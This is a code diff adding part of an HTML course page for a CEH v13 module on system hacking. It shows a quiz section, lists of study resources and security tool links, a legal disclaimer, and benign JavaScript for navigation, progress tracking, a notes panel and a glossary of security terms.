+                        <li>Multi-stage exploitation</li>
+                        <li>Professional reporting</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="card" id="labProgress" style="display: none;">
+                <h3>📊 Laboratory Progress</h3>
+                <div id="labProgressContent">
+                    <!-- Progress will be populated by JavaScript -->
+                </div>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["quiz"]' style="display: none;" id="assessmentBtn">Take Assessment →</button>
+        </section>
+
+        <!-- Quiz Section -->
+        <section id="quiz" class="module-section" role="tabpanel" aria-labelledby="tab-quiz" tabindex="0" hidden="">
+            <h2 class="section-title">📝 Module Assessment</h2>
+            
+            <div class="card">
+                <h3>🎯 Knowledge Verification</h3>
+                <p>Test your understanding of CEH Module 6: System Hacking concepts, tools, and techniques. This comprehensive assessment covers all major topics from the module.</p>
+                
+                <div style="background: linear-gradient(135deg, rgba(52, 152, 219, 0.1), rgba(41, 128, 185, 0.1)); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                    <strong>Assessment Details:</strong>
+                    <ul style="margin: 10px 0; padding-left: 20px;">
+                        <li>25 multiple-choice questions</li>
+                        <li>Passing score: 80% (20/25 correct)</li>
+                        <li>Time limit: 45 minutes</li>
+                        <li>Covers all Module 6 topics</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="quiz-container" id="quizContainer">
+                <!-- Quiz questions will be populated by JavaScript -->
+            </div>
+
+            <div class="card" id="quizResults" style="display: none;">
+                <h3>📊 Assessment Results</h3>
+                <div id="resultsContent">
+                    <!-- Results will be populated by JavaScript -->
+                </div>
+            </div>
+
+            <button class="btn btn-success" data-action="showSection" data-args='["resources"]'>View Resources →</button>
+        </section>
+
+        <!-- Resources Section -->
+        <section id="resources" class="module-section" role="tabpanel" aria-labelledby="tab-resources" tabindex="0" hidden="">
+            <h2 class="section-title">📚 Resources &amp; References</h2>
+            
+            <div class="card">
+                <h3>🎯 Essential Study Materials</h3>
+                <p>Comprehensive resources to support your learning journey in system hacking and ethical hacking techniques.</p>
+            </div>
+
+            <div class="resources-grid">
+                <div class="resource-card">
+                    <h4>📖 Official Documentation</h4>
+                    <ul style="line-height: 1.8;">
+                        <li><a href="https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/" target="_blank">CEH v13 Official Course</a></li>
+                        <li><a href="https://www.eccouncil.org/cehv13-brochure/" target="_blank">CEH v13 Brochure &amp; Syllabus</a></li>
+                        <li><a href="https://ilabs.eccouncil.org/" target="_blank">EC-Council iLabs Platform</a></li>
+                        <li><a href="https://www.eccouncil.org/cybersecurity-exchange/" target="_blank">Cybersecurity Exchange</a></li>
+                    </ul>
+                </div>
+
+                <div class="resource-card">
+                    <h4>🛠️ Tool Documentation</h4>
+                    <ul style="line-height: 1.8;">
+                        <li><a href="https://www.metasploit.com/" target="_blank">Metasploit Framework</a></li>
+                        <li><a href="https://www.openwall.com/john/" target="_blank">John the Ripper</a></li>
+                        <li><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank">THC Hydra</a></li>
+                        <li><a href="https://hashcat.net/hashcat/" target="_blank">Hashcat</a></li>
+                        <li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank">Mimikatz</a></li>
+                    </ul>
+                </div>
+
+                <div class="resource-card">
+                    <h4>📚 Learning Platforms</h4>
+                    <ul style="line-height: 1.8;">
+                        <li><a href="https://tryhackme.com/" target="_blank">TryHackMe</a></li>
+                        <li><a href="https://hackthebox.eu/" target="_blank">Hack The Box</a></li>
+                        <li><a href="https://www.vulnhub.com/" target="_blank">VulnHub</a></li>
+                        <li><a href="https://overthewire.org/wargames/" target="_blank">OverTheWire</a></li>
+                        <li><a href="https://www.pentesterlab.com/" target="_blank">PentesterLab</a></li>
+                    </ul>
+                </div>
+
+                <div class="resource-card">
+                    <h4>🔒 Security References</h4>
+                    <ul style="line-height: 1.8;">
+                        <li><a href="https://attack.mitre.org/" target="_blank">MITRE ATT&amp;CK Framework</a></li>
+                        <li><a href="https://www.exploit-db.com/" target="_blank">Exploit Database</a></li>
+                        <li><a href="https://cve.mitre.org/" target="_blank">CVE Details</a></li>
+                        <li><a href="https://www.sans.org/" target="_blank">SANS Institute</a></li>
+                        <li><a href="https://owasp.org/" target="_blank">OWASP Foundation</a></li>
+                    </ul>
+                </div>
+
+                <div class="resource-card">
+                    <h4>📖 Books &amp; Guides</h4>
+                    <ul style="line-height: 1.8;">
+                        <li><a href="https://www.amazon.com/dp/1119533198" target="_blank">CEH v11 Official Cert Guide</a></li>
+                        <li><a href="https://www.amazon.com/dp/126045455X" target="_blank">The Hacker Playbook 3</a></li>
+                        <li><a href="https://www.amazon.com/dp/1118465814" target="_blank">Metasploit: The Penetration Tester's Guide</a></li>
+                        <li><a href="https://www.amazon.com/dp/1119252687" target="_blank">Penetration Testing Essentials</a></li>
+                    </ul>
+                </div>
+
+                <div class="resource-card">
+                    <h4>🎥 Video Resources</h4>
+                    <ul style="line-height: 1.8;">
+                        <li><a href="https://www.cybrary.it/" target="_blank">Cybrary Free Courses</a></li>
+                        <li><a href="https://www.pluralsight.com/" target="_blank">Pluralsight Security</a></li>
+                        <li><a href="https://www.udemy.com/" target="_blank">Udemy CEH Courses</a></li>
+                        <li><a href="https://www.youtube.com/@ippsec" target="_blank">IppSec YouTube Channel</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>🏆 Certification Path</h3>
+                <div style="background: linear-gradient(135deg, #27ae60, #2ecc71); color: white; padding: 25px; border-radius: 15px; margin: 20px 0;">
+                    <h4>🎯 Next Steps After Module 6:</h4>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0;">
+                        <div style="background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 10px;">
+                            <h5>📚 Continue Learning</h5>
+                            <p>Proceed to <a href="ceh_module7.html" target="_blank" rel="noopener" class="xref">Module 7</a>: Malware Threats</p>
+                        </div>
+                        <div style="background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 10px;">
+                            <h5>🧪 Practice Labs</h5>
+                            <p>Complete additional hands-on exercises</p>
+                        </div>
+                        <div style="background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 10px;">
+                            <h5>📝 Take Exam</h5>
+                            <p>Schedule CEH v13 certification exam</p>
+                        </div>
+                        <div style="background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 10px;">
+                            <h5>🏅 Get Certified</h5>
+                            <p>Earn your CEH certification</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>⚖️ Legal and Ethical Disclaimers</h3>
+                <div class="warning-box">
+                    <p><strong>Important Legal Notice:</strong></p>
+                    <ul style="margin: 10px 0; padding-left: 20px;">
+                        <li>All techniques demonstrated are for educational purposes only</li>
+                        <li>Only perform testing on systems you own or have explicit authorization to test</li>
+                        <li>Unauthorized access to computer systems is illegal in most jurisdictions</li>
+                        <li>Always follow responsible disclosure practices</li>
+                        <li>Respect privacy and <span class="term" data-term="confidentiality">confidentiality</span> at all times</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+    
+
+    
+    </main>
+
+    <nav class="course-nav" aria-label="Course navigation">
+        <a href="ceh_module5.html" rel="prev">← Module 5</a>
+        <a class="is-home" href="index.html">Course home</a>
+        <a class="is-aux" href="cheatsheet-system-hacking.html" target="_blank" rel="noopener">Cheat sheet</a>
+        <a class="is-aux" href="glossary.html" target="_blank" rel="noopener">Glossary</a>
+        <a href="ceh_module7.html" rel="next">Module 7 →</a>
+    </nav>
+
+    <footer class="module-footer">
+        <p class="legal"><strong>Authorized testing only.</strong> Every technique in this module is
+        presented for defensive education and authorized assessment. Running these tools against
+        systems you do not own or have written permission to test is illegal in most jurisdictions.</p>
+        <p>CEH v13 Course Series · Module 6 · Brookdale Community College · 2026</p>
+    </footer>
+</div>
+
+<div id="detailModal" class="modal" role="dialog" aria-modal="true"
+     aria-labelledby="modalContent" aria-hidden="true">
+    <div class="modal-content">
+        <button class="close" type="button" data-action="closeModal" aria-label="Close dialog">&times;</button>
+        <div id="modalContent"></div>
+    </div>
+</div>
+
+<button id="notesToggle" class="notes-fab" type="button"
+        aria-expanded="false" aria-controls="notesPanel" aria-label="Open notes">
+    <span class="notes-fab__icon" aria-hidden="true">📝</span>
+    <span class="notes-fab__text">Notes</span>
+    <span id="notesDot" class="notes-fab__dot" hidden aria-hidden="true"></span>
+</button>
+
+<div id="notesPanel" class="notes-panel" role="dialog" aria-modal="false"
+     aria-label="Study notes" aria-hidden="true">
+    <div class="notes-panel__head">
+        <span class="notes-panel__title">Notes</span>
+        <button id="notesClose" class="notes-panel__close" type="button" aria-label="Close notes">&times;</button>
+    </div>
+    <div class="notes-tabs" role="group" aria-label="Notes scope">
+        <button id="notesTabSection" class="notes-tab" type="button" aria-pressed="true">This section</button>
+        <button id="notesTabScratch" class="notes-tab" type="button" aria-pressed="false">Scratchpad</button>
+    </div>
+    <p id="notesScopeLabel" class="notes-panel__scope">Notes for this section</p>
+    <div class="notes-panel__body">
+        <textarea id="notesArea" class="notes-area" aria-label="Note text"
+                  spellcheck="true"></textarea>
+    </div>
+    <div class="notes-panel__foot">
+        <span class="notes-hint">Saved automatically</span>
+        <button id="notesClear" class="notes-mini is-danger" type="button">Clear</button>
+        <button id="notesExport" class="notes-mini" type="button">Export .md</button>
+    </div>
+</div>
+
+<div id="notification" class="notification" role="status" aria-live="polite"></div>
+
+<script>
+/* ============================================================
+   CEH v13 COURSE CHASSIS  v1.0
+   Shared controller: theming, text size, navigation, progress,
+   modal, notifications, and CSP-safe event dispatch.
+
+   CSP-safe: every handler is bound with addEventListener.
+   Markup uses data-action="name" instead of onclick="name()".
+   Register module-specific behaviour with CEH.register({...}).
+   ============================================================ */
+var CEH = (function () {
+  'use strict';
+
+  var MODULE_ID = document.documentElement.getAttribute('data-module') || 'unknown';
+  var PREFS_KEY = 'ceh:prefs:v1';               // shared across all modules
+  var STATE_KEY = 'ceh:progress:' + MODULE_ID;  // per module
+  var NOTES_KEY = 'ceh:notes:' + MODULE_ID;     // per module (per-section + scratchpad)
+
+  var SCALES = [0.9, 1, 1.15, 1.3];
+  var actions = Object.create(null);
+  var sectionOrder = [];
+  var current = null;
+  var visited = [];
+  var lastFocus = null;
+
+  /* ---------- storage (Safari private mode throws) ---------- */
+  function read(key, fallback) {
+    try {
+      var raw = localStorage.getItem(key);
+      return raw ? JSON.parse(raw) : fallback;
+    } catch (e) { return fallback; }
+  }
+  function write(key, value) {
+    try { localStorage.setItem(key, JSON.stringify(value)); } catch (e) { /* no-op */ }
+  }
+
+  /* ---------- preferences: theme + text size ---------- */
+  var prefs = read(PREFS_KEY, {});
+
+  function systemTheme() {
+    return window.matchMedia &&
+           window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+  }
+
+  function applyTheme(theme) {
+    document.documentElement.setAttribute('data-theme', theme);
+    var btn = document.getElementById('themeToggle');
+    if (btn) {
+      var dark = theme === 'dark';
+      btn.setAttribute('aria-pressed', String(dark));
+      btn.querySelector('.ctl__icon').textContent = dark ? '🌙' : '☀️';
+      btn.querySelector('.ctl__text').textContent = dark ? 'Dark' : 'Light';
+      btn.setAttribute('aria-label', 'Switch to ' + (dark ? 'light' : 'dark') + ' theme');
+    }
+  }
+
+  function setTheme(theme) {
+    prefs.theme = theme;
+    write(PREFS_KEY, prefs);
+    applyTheme(theme);
+  }
+
+  function applyScale(idx) {
+    idx = Math.max(0, Math.min(SCALES.length - 1, idx));
+    prefs.scaleIndex = idx;
+    document.documentElement.style.setProperty('--font-scale', SCALES[idx]);
+    var pct = Math.round(SCALES[idx] * 100) + '%';
+    var out = document.getElementById('fontSizeValue');
+    if (out) out.textContent = pct;
+    var dec = document.getElementById('fontDec');
+    var inc = document.getElementById('fontInc');
+    if (dec) dec.disabled = idx === 0;
+    if (inc) inc.disabled = idx === SCALES.length - 1;
+    announce('Text size ' + pct);
+  }
+
+  function setScale(idx) { applyScale(idx); write(PREFS_KEY, prefs); }
+
+  /* ---------- live region ---------- */
+  function announce(msg) {
+    var el = document.getElementById('a11yStatus');
+    if (el) el.textContent = msg;
+  }
+
+  /* ---------- navigation ---------- */
+  function tabs() {
+    return Array.prototype.slice.call(document.querySelectorAll('.nav-btn'));
+  }
+
+  function showSection(id, opts) {
+    var panel = document.getElementById(id);
+    if (!panel) return;
+    opts = opts || {};
+
+    document.querySelectorAll('.module-section').forEach(function (s) {
+      s.classList.remove('active');
+      s.setAttribute('hidden', '');
+    });
+    panel.classList.add('active');
+    panel.removeAttribute('hidden');
+
+    tabs().forEach(function (t) {
+      var on = t.getAttribute('data-target') === id;
+      t.setAttribute('aria-selected', String(on));
+      t.setAttribute('tabindex', on ? '0' : '-1');
+      t.classList.toggle('active', on);
+    });
+
+    // flush the OUTGOING section's note under the old `current` before it changes
+    var notesPanel = document.getElementById('notesPanel');
+    var notesFollow = notesPanel && notesPanel.classList.contains('open') && notesScope === 'section';
+    if (notesFollow) flushNotes();
+
+    current = id;
+    if (visited.indexOf(id) === -1) visited.push(id);
+    saveProgress();
+    updateProgress();
+
+    // now render the incoming section's note under the new `current`
+    if (notesFollow) renderNotesPanel();
+
+    if (opts.focusTab) {
+      var tab = document.querySelector('.nav-btn[data-target="' + id + '"]');
+      if (tab) tab.focus();
+    }
+    if (!opts.silent) {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      var heading = panel.querySelector('.section-title');
+      announce((heading ? heading.textContent.trim() : id) + ' — section ' +
+               (sectionOrder.indexOf(id) + 1) + ' of ' + sectionOrder.length);
+    }
+  }
+
+  function step(delta) {
+    var i = sectionOrder.indexOf(current) + delta;
+    if (i >= 0 && i < sectionOrder.length) showSection(sectionOrder[i]);
+  }
+
+  function updateProgress() {
+    var pct = sectionOrder.length ? Math.round(visited.length / sectionOrder.length * 100) : 0;
+    var fill = document.getElementById('progressFill');
+    var bar = document.getElementById('progressBar');
+    var text = document.getElementById('progressText');
+    if (fill) fill.style.width = pct + '%';
+    if (bar) bar.setAttribute('aria-valuenow', String(pct));
+    if (text) text.textContent = visited.length + ' of ' + sectionOrder.length + ' sections · ' + pct + '%';
+    tabs().forEach(function (t) {
+      var done = visited.indexOf(t.getAttribute('data-target')) !== -1;
+      var mark = t.querySelector('.nav-btn__done');
+      if (mark) mark.textContent = done ? '✓' : '';
+    });
+  }
+
+  function saveProgress() {
+    var s = read(STATE_KEY, {});
+    s.visited = visited;
+    s.current = current;
+    s.updated = Date.now();
+    write(STATE_KEY, s);
+  }
+
+  function getState() { return read(STATE_KEY, {}); }
+  function setState(patch) {
+    var s = read(STATE_KEY, {});
+    for (var k in patch) if (Object.prototype.hasOwnProperty.call(patch, k)) s[k] = patch[k];
+    s.updated = Date.now();
+    write(STATE_KEY, s);
+  }
+
+  function resetProgress() {
+    try { localStorage.removeItem(STATE_KEY); } catch (e) {}
+    visited = [];
+    showSection(sectionOrder[0]);
+    updateProgress();
+    notify('Progress for this module has been cleared.', 'warning');
+  }
+
+  /* ---------- modal ---------- */
+  function openModal(title, html) {
+    var modal = document.getElementById('detailModal');
+    var body = document.getElementById('modalContent');
+    if (!modal || !body) return;
+    lastFocus = document.activeElement;
+    body.innerHTML = (title ? '<h3>' + title + '</h3>' : '') + (html || '');
+    modal.classList.add('open');
+    modal.setAttribute('aria-hidden', 'false');
+    var close = modal.querySelector('.close');
+    if (close) close.focus();
+  }
+
+  // Legacy modules defined showModal with two different signatures:
+  // showModal(content) and showModal(title, content). Accept both.
+  function showModal(a, b) {
+    if (b === undefined) openModal('', a);
+    else openModal(a, b);
+  }
+
+  function closeModal() {
+    var modal = document.getElementById('detailModal');
+    if (!modal) return;
+    modal.classList.remove('open');
+    modal.setAttribute('aria-hidden', 'true');
+    if (lastFocus && lastFocus.focus) lastFocus.focus();
+  }
+
+  function trapFocus(e) {
+    var modal = document.getElementById('detailModal');
+    if (!modal || !modal.classList.contains('open') || e.key !== 'Tab') return;
+    var f = modal.querySelectorAll('a[href],button:not([disabled]),input,select,textarea,[tabindex]:not([tabindex="-1"])');
+    if (!f.length) return;
+    var first = f[0], last = f[f.length - 1];
+    if (e.shiftKey && document.activeElement === first) { e.preventDefault(); last.focus(); }
+    else if (!e.shiftKey && document.activeElement === last) { e.preventDefault(); first.focus(); }
+  }
+
+  /* ---------- notifications ---------- */
+  var notifyTimer;
+  function notify(message, type) {
+    var el = document.getElementById('notification');
+    if (!el) return;
+    el.className = 'notification show' + (type && type !== 'success' ? ' ' + type : '');
+    el.textContent = message;
+    announce(message);
+    clearTimeout(notifyTimer);
+    notifyTimer = setTimeout(function () { el.className = 'notification'; }, 3600);
+  }
+
+  /* ---------- notes ----------
+     Two scopes stored under one per-module key:
+       notes.scratch          = module-wide scratchpad
+       notes.sections[sectionId] = per-section note
+     The popup shows a tab for the current section and a tab for the scratchpad,
+     auto-saving on input (debounced). Export produces a Markdown file. */
+  var notes = null;
+  var notesScope = 'section';       // 'section' | 'scratch'
+  var notesSaveTimer = null;
+  var notesLastFocus = null;
+
+  function loadNotes() {
+    if (notes) return notes;
+    notes = read(NOTES_KEY, { scratch: '', sections: {} });
+    if (!notes.sections) notes.sections = {};
+    if (typeof notes.scratch !== 'string') notes.scratch = '';
+    return notes;
+  }
+
+  function saveNotes() {
+    write(NOTES_KEY, loadNotes());
+    updateNotesIndicator();
+  }
+
+  function currentNoteValue() {
+    var n = loadNotes();
+    return notesScope === 'scratch' ? n.scratch : (n.sections[current] || '');
+  }
+
+  function setCurrentNoteValue(v) {
+    var n = loadNotes();
+    if (notesScope === 'scratch') n.scratch = v;
+    else n.sections[current] = v;
+  }
+
+  function sectionTitle(id) {
+    var tab = document.querySelector('.nav-btn[data-target="' + id + '"]');
+    if (tab) return tab.textContent.replace(/[✓]/g, '').trim();
+    return id;
+  }
+
+  function hasAnyNotes() {
+    var n = loadNotes();
+    if (n.scratch && n.scratch.trim()) return true;
+    for (var k in n.sections) if (n.sections[k] && n.sections[k].trim()) return true;
+    return false;
+  }
+
+  function updateNotesIndicator() {
+    var dot = document.getElementById('notesDot');
+    if (dot) dot.hidden = !hasAnyNotes();
+  }
+
+  function renderNotesPanel() {
+    var area = document.getElementById('notesArea');
+    var label = document.getElementById('notesScopeLabel');
+    var secBtn = document.getElementById('notesTabSection');
+    var scratchBtn = document.getElementById('notesTabScratch');
+    if (!area) return;
+    if (secBtn) secBtn.setAttribute('aria-pressed', String(notesScope === 'section'));
+    if (scratchBtn) scratchBtn.setAttribute('aria-pressed', String(notesScope === 'scratch'));
+    if (label) {
+      label.textContent = notesScope === 'scratch'
+        ? 'Module scratchpad'
+        : 'Notes for: ' + sectionTitle(current);
+    }
+    area.value = currentNoteValue();
+    area.placeholder = notesScope === 'scratch'
+      ? 'A scratchpad for the whole module — anything not tied to one section.'
+      : 'Notes for this section. They reappear whenever you return to this tab.';
+  }
+
+  function openNotes() {
+    var panel = document.getElementById('notesPanel');
+    if (!panel) return;
+    loadNotes();
+    notesLastFocus = document.activeElement;
+    renderNotesPanel();
+    panel.classList.add('open');
+    panel.setAttribute('aria-hidden', 'false');
+    var area = document.getElementById('notesArea');
+    if (area) area.focus();
+    var toggle = document.getElementById('notesToggle');
+    if (toggle) toggle.setAttribute('aria-expanded', 'true');
+  }
+
+  function closeNotes() {
+    var panel = document.getElementById('notesPanel');
+    if (!panel) return;
+    flushNotes();
+    panel.classList.remove('open');
+    panel.setAttribute('aria-hidden', 'true');
+    var toggle = document.getElementById('notesToggle');
+    if (toggle) { toggle.setAttribute('aria-expanded', 'false'); toggle.focus(); }
+    else if (notesLastFocus && notesLastFocus.focus) notesLastFocus.focus();
+  }
+
+  function toggleNotes() {
+    var panel = document.getElementById('notesPanel');
+    if (panel && panel.classList.contains('open')) closeNotes();
+    else openNotes();
+  }
+
+  function setNotesScope(scope) {
+    flushNotes();
+    notesScope = scope === 'scratch' ? 'scratch' : 'section';
+    renderNotesPanel();
+    var area = document.getElementById('notesArea');
+    if (area) area.focus();
+  }
+
+  function onNotesInput() {
+    setCurrentNoteValue(document.getElementById('notesArea').value);
+    clearTimeout(notesSaveTimer);
+    notesSaveTimer = setTimeout(saveNotes, 400);
+  }
+
+  function flushNotes() {
+    var area = document.getElementById('notesArea');
+    if (!area) return;
+    setCurrentNoteValue(area.value);
+    clearTimeout(notesSaveTimer);
+    saveNotes();
+  }
+
+  function exportNotes() {
+    var n = loadNotes();
+    var title = (document.querySelector('.header h1') || {}).textContent || ('Module ' + MODULE_ID);
+    var lines = ['# Notes — ' + title.trim(), '', '_Exported ' + new Date().toLocaleString() + '_', ''];
+    sectionOrder.forEach(function (id) {
+      var v = n.sections[id];
+      if (v && v.trim()) {
+        lines.push('## ' + sectionTitle(id), '', v.trim(), '');
+      }
+    });
+    if (n.scratch && n.scratch.trim()) {
+      lines.push('## Scratchpad', '', n.scratch.trim(), '');
+    }
+    if (lines.length <= 4) {
+      notify('No notes to export yet.', 'warning');
+      return;
+    }
+    var blob = new Blob([lines.join('\n')], { type: 'text/markdown' });
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = 'ceh-' + MODULE_ID + '-notes.md';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    setTimeout(function () { URL.revokeObjectURL(url); }, 1000);
+    notify('Notes exported.');
+  }
+
+  function clearScopeNotes() {
+    var what = notesScope === 'scratch' ? 'the scratchpad' : 'notes for this section';
+    if (!window.confirm('Clear ' + what + '? This cannot be undone.')) return;
+    setCurrentNoteValue('');
+    var area = document.getElementById('notesArea');
+    if (area) area.value = '';
+    saveNotes();
+    notify('Cleared ' + what + '.', 'warning');
+  }
+
+  /* ---------- CSP-safe action dispatch ---------- */
+  function register(map) {
+    for (var name in map) {
+      if (Object.prototype.hasOwnProperty.call(map, name)) actions[name] = map[name];
+    }
+  }
+
+  function parseArgs(el) {
+    var raw = el.getAttribute('data-args');
+    if (!raw) return [];
+    var args;
+    try { args = JSON.parse(raw); } catch (e) { return [raw]; }
+    // legacy handlers took `this` as a positional argument; put the element back
+    return args.map(function (a) { return a === '__EL__' ? el : a; });
+  }
+
+  function el_closest(target, sel) {
+    return target && typeof target.closest === 'function' ? target.closest(sel) : null;
+  }
+
+  function onClick(e) {
+    // tabs carry data-target rather than data-action
+    var tab = el_closest(e.target, '.nav-btn');
+    if (tab && tab.getAttribute('data-target')) {
+      e.preventDefault();
+      showSection(tab.getAttribute('data-target'));
+      return;
+    }
+
+    var el = el_closest(e.target, '[data-action]');
+    if (!el) return;
+    var name = el.getAttribute('data-action');
+
+    if (name === 'showSection') { e.preventDefault(); showSection(parseArgs(el)[0]); return; }
+    if (name === 'closeModal')  { e.preventDefault(); closeModal(); return; }
+    if ((name === 'openModal' || name === 'showModal') && !actions[name]) {
+      e.preventDefault();
+      var a = parseArgs(el);
+      if (name === 'showModal') showModal(a[0], a[1]);
+      else openModal(a[0], a[1]);
+      return;
+    }
+    if (name === 'resetProgress') { e.preventDefault(); resetProgress(); return; }
+
+    var fn = actions[name];
+    if (typeof fn === 'function') {
+      e.preventDefault();
+      try { fn.apply(el, parseArgs(el).concat([e])); }
+      catch (err) {
+        console.error('[CEH] action "' + name + '" failed:', err);
+        notify('That demo could not run. See the browser console for details.', 'error');
+      }
+    } else {
+      console.warn('[CEH] no handler registered for action:', name);
+    }
+  }
+
+  /* ---------- roving tabindex on the tablist ---------- */
+  function onNavKey(e) {
+    var t = el_closest(e.target, '.nav-btn');
+    if (!t) return;
+    var list = tabs(), i = list.indexOf(t), next = null;
+    if (e.key === 'ArrowRight' || e.key === 'ArrowDown') next = list[(i + 1) % list.length];
+    else if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') next = list[(i - 1 + list.length) % list.length];
+    else if (e.key === 'Home') next = list[0];
+    else if (e.key === 'End') next = list[list.length - 1];
+    if (next) { e.preventDefault(); showSection(next.getAttribute('data-target'), { focusTab: true }); }
+  }
+
+  function onGlobalKey(e) {
+    if (e.key === 'Escape') {
+      if (tipTarget) { var tt = tipTarget; tipSuppressed = tt; hideTip(); if (tt.focus) tt.focus(); return; }
+      var np = document.getElementById('notesPanel');
+      if (np && np.classList.contains('open')) { closeNotes(); return; }
+      closeModal(); return;
+    }
+    trapFocus(e);
+    var tag = (e.target && e.target.tagName || '').toLowerCase();
+    if (tag === 'input' || tag === 'textarea' || tag === 'select') return;
+    if (el_closest(e.target, '.nav-btn')) return;   // handled by roving tabindex
+    if (e.altKey && e.key === 'ArrowRight') { e.preventDefault(); step(1); }
+    if (e.altKey && e.key === 'ArrowLeft')  { e.preventDefault(); step(-1); }
+  }
+
+  /* ---------- ambient effect ---------- */
+  function matrixEffect() {
+    if (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+    var host = document.getElementById('matrixBg');
+    if (!host) return;
+    var chars = '01アカサタナハマヤラワ';
+    for (var i = 0; i < 18; i++) {
+      (function (n) {
+        setTimeout(function () {
+          var s = document.createElement('span');
+          s.className = 'matrix-line';
+          s.textContent = chars[Math.floor(Math.random() * chars.length)];
+          s.style.left = (Math.random() * 100) + '%';
+          s.style.animationDelay = (Math.random() * 6) + 's';
+          s.style.animationDuration = (6 + Math.random() * 6) + 's';
+          host.appendChild(s);
+        }, n * 110);
+      })(i);
+    }
+  }
+
+  /* ---------- glossary + tooltips ----------
+     Author terms two ways:
+       <span class="term" data-tip="inline definition">phrase</span>
+       <span class="term" data-term="salt">salt</span>   (pulled from GLOSSARY)
+     A single floating bubble is positioned under (or over) the term.
+     Works on hover, keyboard focus, and tap; dismisses on Escape / outside tap.
+     CSP-safe: all wiring via addEventListener; no inline handlers. */
+  var GLOSSARY = {
+    'aes': 'Advanced Encryption Standard \u2014 the modern symmetric cipher, typically with 128- or 256-bit keys.',
+    'arp spoofing': 'Sending forged ARP messages to associate the attacker\'s MAC with another host\'s IP, enabling interception.',
+    'asymmetric encryption': 'Public-key cryptography using a linked key pair \u2014 a public key to encrypt/verify and a private key to decrypt/sign.',
+    'attack surface': 'The total set of points where an attacker could try to enter or extract data from a system.',
+    'availability': 'Ensuring systems and data are accessible to authorized users when needed.',
+    'botnet': 'A network of compromised devices controlled by an attacker, often used to launch DDoS attacks.',
+    'c2': 'Command and Control \u2014 the infrastructure an attacker uses to remotely direct compromised systems.',
+    'cia triad': 'Confidentiality, Integrity, and Availability \u2014 the three core goals of information security.',
+    'confidentiality': 'Ensuring information is readable only by authorized parties, typically via encryption.',
+    'container escape': 'An attack that breaks out of a container\'s isolation to reach the host or other containers.',
+    'csrf': 'Cross-Site Request Forgery \u2014 tricking a logged-in user\'s browser into making an unwanted authenticated request.',
+    'cve': 'Common Vulnerabilities and Exposures \u2014 a public catalog assigning a unique ID to each known vulnerability.',
+    'ddos': 'Distributed Denial of Service \u2014 overwhelming a target with traffic from many sources to make it unavailable.',
+    'deauth': 'A forged Wi-Fi management frame that disconnects a client, often to force a reconnection that yields a handshake.',
+    'defense in depth': 'Layering multiple independent security controls so that if one fails, others still protect the system.',
+    'digital signature': 'Data signed with a private key that anyone can verify with the matching public key, proving origin and integrity.',
+    'directory traversal': 'An attack that uses ../ sequences to access files outside the web server\'s intended directory.',
+    'ecc': 'Elliptic Curve Cryptography \u2014 asymmetric cryptography giving RSA-level security with much smaller keys.',
+    'enumeration': 'Actively extracting detailed information \u2014 usernames, shares, services \u2014 from a target\'s systems.',
+    'evil twin': 'A rogue access point impersonating a legitimate network\'s name to lure victims into connecting.',
+    'exploit': 'Code or a technique that takes advantage of a specific vulnerability to cause unintended behavior.',
+    'harvest now, decrypt later': 'Recording encrypted traffic today to decrypt once quantum computers mature; needs no quantum capability at collection time.',
+    'hashing': 'A one-way function mapping any input to a fixed-size digest; used for integrity checks and password storage.',
+    'iam': 'Identity and Access Management \u2014 the cloud system governing who can do what to which resources.',
+    'idor': 'Insecure Direct Object Reference \u2014 changing a reference (like an ID) to access another user\'s data.',
+    'ids': 'Intrusion Detection System \u2014 monitors network or host activity and alerts on suspected malicious behavior.',
+    'injection': 'A flaw where untrusted input is sent to an interpreter as part of a command or query and executed as code.',
+    'integrity': 'Ensuring data has not been altered; tampering can be detected, typically via hashing.',
+    'ips': 'Intrusion Prevention System \u2014 like an IDS but able to actively block detected malicious traffic.',
+    'jailbreaking': 'Gaining privileged administrative control of an iOS device by removing Apple\'s restrictions.',
+    'lateral movement': 'Moving from one compromised system to others inside a network to reach higher-value targets.',
+    'least privilege': 'Granting every identity only the permissions it needs and no more, to limit the blast radius of a compromise.',
+    'malware': 'Malicious software designed to damage, disrupt, or gain unauthorized access to systems.',
+    'man-in-the-middle': 'An attacker who secretly relays and possibly alters communication between two parties who believe they talk directly.',
+    'mdm': 'Mobile Device Management \u2014 software for centrally securing and enforcing policy on an organization\'s mobile devices.',
+    'mfa': 'Multi-Factor Authentication \u2014 requiring two or more independent proofs of identity to log in.',
+    'non-repudiation': 'A guarantee that a party cannot credibly deny having taken an action, e.g. signing a message.',
+    'owasp': 'Open Web Application Security Project \u2014 a nonprofit best known for its Top 10 lists of critical security risks.',
+    'parameterized query': 'A query that sends SQL code and user data on separate channels so input can never be parsed as code \u2014 the definitive SQLi fix.',
+    'payload': 'The part of an attack that performs the intended malicious action once delivered.',
+    'phishing': 'Fraudulent messages that impersonate a trusted source to steal credentials or deliver malware.',
+    'pki': 'Public Key Infrastructure \u2014 the system of certificates and authorities that binds public keys to verified identities.',
+    'plc': 'Programmable Logic Controller \u2014 a rugged computer that directly controls physical industrial machinery.',
+    'post-quantum cryptography': 'New algorithms (e.g. ML-KEM, ML-DSA) designed to resist attacks from quantum computers.',
+    'pretexting': 'Inventing a fabricated scenario or identity to persuade a victim to divulge information or act.',
